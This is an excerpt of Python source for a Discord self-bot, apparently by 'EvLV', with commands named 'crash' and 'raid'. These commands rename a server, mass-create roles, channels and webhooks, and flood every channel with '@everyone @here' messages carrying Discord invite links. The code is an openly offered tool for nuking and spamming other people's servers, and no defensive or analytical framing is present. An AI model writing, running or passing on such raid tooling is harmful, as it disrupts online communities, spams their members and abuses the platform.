...
async def git(ctx):
	embed = discord.Embed(
		title = f'SelfBot {v}',
		description = f'Вы используете селф-бота версии `{v}`\nСсылка на селф-бота: :earth_asia: [GitHub](https://github.com/GeneralZahaev/SelfBot.git)',
...
@client.command()
async def create_guild(ctx, *, nameg='EvLV guild'):
	new = await client.create_guild(name=nameg)
	listc = await new.fetch_channels()
	for c in listc:
		await c.delete()

	await new.create_text_channel('made-by-EvLV')
...
@client.command()
async def crash(ctx):
	await ctx.guild.edit(name='Crashed by EvLV')
	...
	for i in range(50):
		await ctx.guild.create_role(name='Crash By EvLV')
		ch = await ctx.guild.create_text_channel('crash-by-evlv')
		await ch.create_webhook(name='crash4d')

@client.event
async def on_guild_channel_create(channel):
	if channel.name == 'crash-by-evlv':
		for i in range(100):
			hooks = await channel.webhooks()
			for hook in hooks:
				await hook.send('@everyone @here Crash By EvLV https://discord.gg/uW2qhBQHHA')
...
async def sendhook(ctx, channelm):
		for i in range(100):
			...
			for hook in hooks:
				await hook.send('@everyone @here raid by EvLV! https://discord.gg/ZfaRSxJVn5')

@client.command()
async def raid(ctx):
	await ctx.message.delete()
	for i in range(6):
		text = f'{randint(0,999)} | Raid by EvLV! discord.gg/uW2qhBQHHA @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||'
		await ctx.send(text)
	for c in ctx.guild.text_channels:
		try:
			await c.create_webhook(name='Raid By EvLV')
		except Exception as e:
			print(e)
	...
	try:
			for c in ctx.guild.text_channels:
				...
				for hook in hooks:
					await hook.send(f'{randint(0,999)} | Raid by EvLV! @everyone @here')
	except Exception as e:
			print(e)

	for c in ctx.guild.text_channels:
		try:
			await c.send(f'{randint(0,999)} | Raid by EvLV! discord.gg/uW2qhBQHHA @everyone @here\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n||{randint(0,1338)}||')
		except:
			pass
